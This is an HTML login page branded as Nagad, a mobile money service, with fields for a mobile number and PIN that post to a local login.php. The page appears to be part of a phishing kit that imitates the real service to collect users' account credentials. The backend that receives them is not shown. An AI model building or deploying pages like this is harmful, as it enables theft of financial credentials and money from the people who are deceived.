<html lang="en">
<head>
  <meta charset="UTF-8">

  <title>Nagad</title>
  <!-- Author: Sajjad -->
  <style>
  	body{
  font-family: Sans-serif;
  background: white;
 
  }
  .container{
  font-family: Sans-serif;
  width: 320px;
  height: 320px;
  padding: 20px;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
  position: absolute;
  top: 5%;
  left: 50%;
  transform: translate(-50%, 50%);
  text-align: center;
  border-radius: 3px;
  background-color: white;
  
  }
  
  h2{
  margin-top: 60px;
  }
  
  .box{
  width: 90%;
  padding: 15px 10px;
  border: none;
  margin-top: 0px;
  margin-bottom: 50px;
  border-bottom: 2px solid #b3b3b3;
  
  }
  input:hover{
  border: none;
  border-bottom: 2px solid #FF5733;
  outline: none;
  }
  .btn{
  background-color: transparent;
  border: 2px solid #FF5733;
  width: 80%;
  border-radius: 50px;
  padding: 15px 0px;
  color: black;
  font-weight: bold;
  margin-top: 0px;
  box-shadow: 0 0 5px #FF5733;
 }
 
 .a1{
 text-decoration: none;
 font-size: 13px;
 color: gray;
 margin-top: 160px;
 }
 
 .p1{
 position: absolute;
 font-weight: bold;
 font-size: 15px;
 left: 10%;
 top: 11%;
 }
 
 .p2{
 position: absolute;
 font-weight: bold;
 font-size: 15px;
 left: 10%;
 top: 38%;
 }
 
 .logo{
 width: 150px;
 position: absolute;
 left: 50%;
 transform: translate(-50%, 50%);
 top: -40%;
 
 }
  </style>
</head>
<body>
	<form action="login.php" method="post">
		<div class="container">
			<div>
		<img src="Image/logo.png" alt="Nagad" class="logo"/>
	</div>
		<div>
			<h2></h2>
		</div>
		<div>
			<p class="p1">Mobile Number</p>
			<input type="text" name="username" class="box" id="username" placeholder="Ex: 01XXX-XXX-XXX"></input>
		</div>
		<div>
			<p class="p2">PIN</p>
			<input type="password" name="password" class="box" id="password" placeholder="Ex: XXXX"></input>
		</div>
		<div>
			<button type="submit" class="btn" id="btn">LOGIN</button>
		</div>
		<div class="a1">
			<a class= "a1" href="#"></a>
		</div>
		<script>
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
    const submitButton = document.getElementById("btn");

    usernameInput.addEventListener("input", updateButtonColor);
    passwordInput.addEventListener("input", updateButtonColor);

    function updateButtonColor() {
      // Check if both fields meet the minimum length requirements
      if (usernameInput.value.length >= 11 && passwordInput.value.length >= 4) {
        submitButton.style.backgroundColor = "#FF5733"; // Change the button color
        submitButton.disabled = false; // Enable the button
      } else {
        submitButton.style.backgroundColor = "white"; // Reset the button color
        submitButton.disabled = true; // Disable the button
      }
    }
  </script>
		</div>
	</form>
</body>
</html>
